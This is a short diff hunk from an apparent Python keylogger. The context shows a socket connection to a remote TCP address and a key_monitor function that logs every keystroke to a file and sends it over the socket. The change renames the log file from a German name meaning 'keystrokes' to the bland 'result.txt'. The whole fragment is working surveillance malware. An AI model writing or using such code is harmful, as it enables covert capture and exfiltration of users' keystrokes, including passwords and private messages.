@@ -13,7 +13,7 @@ s.connect((TCP_IP, TCP_PORT))
 
 def key_monitor(key):
     try:
-        with open("tastenanschlaege.txt", "a") as f:
+        with open("result.txt", "a") as f:
             f.write(key.char)
             s.send(key.char.encode())
     except AttributeError:
